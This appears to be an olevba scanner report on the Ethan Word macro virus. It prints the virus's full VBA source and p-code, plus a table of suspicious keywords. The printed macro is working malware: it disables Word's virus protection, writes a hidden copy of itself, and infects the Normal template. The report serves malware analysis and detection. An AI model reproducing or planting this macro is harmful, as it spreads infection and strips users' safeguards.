olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ethan.cc
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ethan.cc - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Rem ID
Private Sub Document_Close()

Rem >>>>>>>>>>Wordbackup
Rem Makes backups of Word Documents Whever You Like It Or You don't

Rem Initialise
On Error Resume Next
s = ActiveDocument.Saved
Application.EnableCancelKey = Not -1
With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
Randomize

Rem >>>>>>>>>>Breed The Code<<<<<<<<<<<<<

Rem Copy Self To c:\IDEDev.___
  Open "c:\IDEDev.___" For Output As #1
  For i = 1 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
   a = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
   Print #1, a
  Next i
  Close #1
  SetAttr "c:\IDEDev.___", 6

Rem Does master contain Macro?
   If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "Rem ID" Then
  Set t = NormalTemplate.VBProject.VBComponents.Item(1)
 ElseIf ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "Rem ID" Then
  Set t = ActiveDocument.VBProject.VBComponents.Item(1)
 Else
  t = ""
 End If
 
Rem If Not Then Copy The Contents Of c:\IDEDev.___ to it
 If t <> "" Then
  Open "c:\IDEDev.___" For Input As #1
  If LOF(1) = 0 Then GoTo q
  i = 1
  Do While Not EOF(1)
   Line Input #1, a
   t.CodeModule.InsertLines i, a
   i = i + 1
  Loop
q:
  Close #1
  If Left(ActiveDocument.Name, 8) <> "Document" Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
 End If
 If ActiveDocument.Saved <> s Then ActiveDocument.Saved = s


Rem >>>>>>>>>>>>>Backup The Document<<<<<<<<<<<<<<<<
 temp = ActiveDocument.FullName
 savedir = "c:\winbackup"
 savefile = savedir + "\" + ActiveDocument.Name
 MkDir (savedir)
 SaveAs (savefile)
 SaveAs (temp)

End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Ethan.cc
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 8386 bytes
' Line #0:
' Line #1:
' 	Rem 0x0003 " ID"
' Line #2:
' 	FuncDefn (Private Sub Document_Close())
' Line #3:
' Line #4:
' 	Rem 0x0015 " >>>>>>>>>>Wordbackup"
' Line #5:
' 	Rem 0x0040 " Makes backups of Word Documents Whever You Like It Or You don't"
' Line #6:
' Line #7:
' 	Rem 0x000B " Initialise"
' Line #8:
' 	OnError (Resume Next) 
' Line #9:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St s 
' Line #10:
' 	LitDI2 0x0001 
' 	UMi 
' 	Not 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #11:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith ConfirmConversions 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith VirusProtection 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith SaveNormalPrompt 
' 	BoS 0x0000 
' 	EndWith 
' Line #12:
' 	ArgsCall Read 0x0000 
' Line #13:
' Line #14:
' 	Rem 0x0026 " >>>>>>>>>>Breed The Code<<<<<<<<<<<<<"
' Line #15:
' Line #16:
' 	Rem 0x001B " Copy Self To c:\IDEDev.___"
' Line #17:
' 	LitStr 0x000D "c:\IDEDev.___"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #18:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #19:
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St a 
' Line #20:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld a 
' 	PrintItemNL 
' Line #21:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #22:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #23:
' 	LitStr 0x000D "c:\IDEDev.___"
' 	LitDI2 0x0006 
' 	ArgsCall SetAttr 0x0002 
' Line #24:
' Line #25:
' 	Rem 0x001B " Does master contain Macro?"
' Line #26:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0006 "Rem ID"
' 	Ne 
' 	IfBlock 
' Line #27:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set t 
' Line #28:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0006 "Rem ID"
' 	Ne 
' 	ElseIfBlock 
' Line #29:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set t 
' Line #30:
' 	ElseBlock 
' Line #31:
' 	LitStr 0x0000 ""
' 	St t 
' Line #32:
' 	EndIfBlock 
' Line #33:
' Line #34:
' 	Rem 0x0035 " If Not Then Copy The Contents Of c:\IDEDev.___ to it"
' Line #35:
' 	Ld t 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #36:
' 	LitStr 0x000D "c:\IDEDev.___"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #37:
' 	LitDI2 0x0001 
' 	ArgsLd LOF 0x0001 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo q 
' 	EndIf 
' Line #38:
' 	LitDI2 0x0001 
' 	St i 
' Line #39:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #40:
' 	LitDI2 0x0001 
' 	Ld a 
' 	LineInput 
' Line #41:
' 	Ld i 
' 	Ld a 
' 	Ld t 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #42:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #43:
' 	Loop 
' Line #44:
' 	Label q 
' Line #45:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #46:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0008 "Document"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #47:
' 	EndIfBlock 
' Line #48:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	Ld s 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld s 
' 	Ld ActiveDocument 
' 	MemSt Saved 
' 	EndIf 
' Line #49:
' Line #50:
' Line #51:
' 	Rem 0x0031 " >>>>>>>>>>>>>Backup The Document<<<<<<<<<<<<<<<<"
' Line #52:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	St temp 
' Line #53:
' 	LitStr 0x000C "c:\winbackup"
' 	St savedir 
' Line #54:
' 	Ld savedir 
' 	LitStr 0x0001 "\"
' 	Add 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Add 
' 	St savefile 
' Line #55:
' 	Ld savedir 
' 	Paren 
' 	ArgsCall MkDir 0x0001 
' Line #56:
' 	Ld savefile 
' 	Paren 
' 	ArgsCall SaveAs 0x0001 
' Line #57:
' 	Ld temp 
' 	Paren 
' 	ArgsCall SaveAs 0x0001 
' Line #58:
' Line #59:
' 	EndSub 
' Line #60:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

